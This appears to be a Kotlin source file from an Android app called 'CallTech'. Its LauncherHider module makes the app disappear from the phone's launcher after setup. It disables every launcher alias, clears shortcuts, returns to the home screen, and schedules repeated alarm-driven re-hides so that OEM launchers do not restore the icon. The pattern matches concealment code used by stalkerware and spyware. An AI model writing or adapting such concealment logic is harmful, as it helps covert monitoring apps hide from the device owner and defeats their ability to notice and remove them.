package com.calltech

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ShortcutManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log

/**
 * OEM launchers (Realme/Xiaomi/Vivo) last launcher disable ignore karte hain.
 * Pehle HiddenAlias ON, phir CallTech alias OFF — tabhi drawer refresh hota hai.
 */
object LauncherHider {
    private const val TAG = "LauncherHider"
    private const val PREFS = "calltech_install"
    private const val KEY_HIDDEN = "launcher_hidden"
    const val EXTRA_STAGE = "hide_stage"

    private const val VISIBLE_ALIAS = "com.calltech.LauncherAlias"
    private const val HIDDEN_ALIAS = "com.calltech.HiddenAlias"
    private const val REQUEST_BASE = 8820

    private val hideHandler = Handler(Looper.getMainLooper())

    fun hide(context: Context, goHome: Boolean = false, keepProcess: Boolean = true) {
        markHidden(context.applicationContext)
        if (goHome) {
            goHome(context.applicationContext)
        }
        applyStage(context.applicationContext, 0)
    }

    fun hideIfMarked(context: Context) {
        val app = context.applicationContext
        val marked = app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getBoolean(KEY_HIDDEN, false)
        if (marked || InstallFlow.isSetupComplete(app)) {
            applyStage(app, 0)
        }
    }

    fun scheduleHideAfterLeave(context: Context) {
        markAndSchedule(context)
    }

    fun markAndSchedule(context: Context) {
        val app = context.applicationContext
        markHidden(app)
        goHome(app)
        clearShortcuts(app)
        scheduleStage(app, stage = 0, delayMs = 800L)
        scheduleStage(app, stage = 0, delayMs = 2500L)
        scheduleStage(app, stage = 1, delayMs = 5000L)
        scheduleStage(app, stage = 2, delayMs = 12000L)

        hideHandler.postDelayed({ applyStage(app, 0) }, 1200)
        hideHandler.postDelayed({ applyStage(app, 0) }, 2800)
        hideHandler.postDelayed({ applyStage(app, 1) }, 5500)
    }

    fun applyStage(context: Context, stage: Int) {
        val app = context.applicationContext
        val pm = app.packageManager
        val visible = ComponentName(app.packageName, VISIBLE_ALIAS)
        val hidden = ComponentName(app.packageName, HIDDEN_ALIAS)

        try {
            setEnabled(pm, visible, enabled = false, allowKill = stage != 0)
            setEnabled(pm, hidden, enabled = false, allowKill = true)
            Log.d(
                TAG,
                "Hide stage=$stage visible=${pm.getComponentEnabledSetting(visible)} " +
                    "hidden=${pm.getComponentEnabledSetting(hidden)}",
            )
        } catch (error: Exception) {
            Log.e(TAG, "Hide stage $stage failed: ${error.message}")
        }
    }

    private fun setEnabled(
        pm: PackageManager,
        component: ComponentName,
        enabled: Boolean,
        allowKill: Boolean,
    ) {
        val target = if (enabled) {
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        } else {
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        }
        val current = pm.getComponentEnabledSetting(component)
        if (current == target) {
            return
        }
        val flags = if (allowKill) 0 else PackageManager.DONT_KILL_APP
        pm.setComponentEnabledSetting(component, target, flags)
    }

    private fun isOn(pm: PackageManager, component: ComponentName, defaultOn: Boolean): Boolean {
        return when (pm.getComponentEnabledSetting(component)) {
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> true
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED -> false
            else -> defaultOn
        }
    }

    private fun scheduleStage(app: Context, stage: Int, delayMs: Long) {
        val alarmManager = app.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val intent = Intent(app, HideLauncherReceiver::class.java).putExtra(EXTRA_STAGE, stage)
        val pending = PendingIntent.getBroadcast(
            app,
            REQUEST_BASE + stage + delayMs.toInt(),
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE,
        )
        val triggerAt = System.currentTimeMillis() + delayMs
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                alarmManager.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerAt, pending)
            } else {
                alarmManager.set(AlarmManager.RTC_WAKEUP, triggerAt, pending)
            }
        } catch (error: Exception) {
            Log.w(TAG, "Hide alarm failed: ${error.message}")
        }
    }

    private fun goHome(app: Context) {
        try {
            app.startActivity(
                Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_HOME)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                },
            )
        } catch (error: Exception) {
            Log.w(TAG, "Home launch after hide failed: ${error.message}")
        }
    }

    private fun clearShortcuts(app: Context) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N_MR1) {
            return
        }
        try {
            val shortcuts = app.getSystemService(ShortcutManager::class.java) ?: return
            shortcuts.removeAllDynamicShortcuts()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N_MR1 && shortcuts.pinnedShortcuts.isNotEmpty()) {
                shortcuts.disableShortcuts(shortcuts.pinnedShortcuts.map { it.id })
            }
        } catch (error: Exception) {
            Log.w(TAG, "Shortcut clear failed: ${error.message}")
        }
    }

    private fun markHidden(app: Context) {
        app.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit()
            .putBoolean(KEY_HIDDEN, true)
            .apply()
    }
}
